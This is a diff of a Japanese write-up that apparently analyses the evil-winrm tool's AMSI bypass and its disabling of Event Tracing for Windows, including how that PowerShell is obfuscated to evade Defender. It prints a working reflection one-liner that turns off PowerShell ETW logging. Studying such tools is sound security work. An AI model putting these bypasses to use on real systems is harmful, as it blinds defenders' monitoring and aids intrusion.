@@ -119,8 +119,8 @@ _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
 [+] menu
 [+] exit
 ```
-AMSIをバイバスるるためにPowershellが実行される  
-このPowershellは、evil-winrmのコード上では難読化されている  
+AMSIをバイバスするためにPowershellが実行される  
+このPowershellは、evil-winrmのコード上では「変数名のランダム化＋文字列をバイト変換＋Base64で難読化＋」されている（[リンク](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L1059)）  
 ちなみにこのPowershellを一気に実行するとDefenderでは検知されるので、各「#jamp」コードごとに２秒待機するようになっている
 ```powershell
 FUncTIon Get-PZ2zmpurexnDXVSxx {
@@ -233,7 +233,8 @@ PS C:\Users\me> 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
 AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
 ```
 
-また、ETW(Event Tracing for Windows)を無効にする
+また次に、ETW(Event Tracing for Windows)を無効にする  
+こちらもPowershellは当初「変数名のランダム化＋文字列をバイト変換＋Base64で難読化＋」されている（[リンク](https://github.com/Hackplayers/evil-winrm/blob/ffe958c841da655ba3c44740ca22aa0eee9fc5ed/evil-winrm.rb#L1121)）
 ```powershell
 # [Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetFIeLD("m_enabled","NOnPUBLIC,Instance").SetValue([ReF].AsSEMBLY.GEtTyPe("System.Management.Automation.Tracing.PSEtwLogProvider").GetFIeLD("etwProvider","NOnPUBLIC,StATIc").GETVALue($XCg4haX2thXmkYPuR),0) 
 # [Reflection.Assembly]::LoadWithPartialName("System.Core")で、アセンブリ「System.Core.dll」をロード
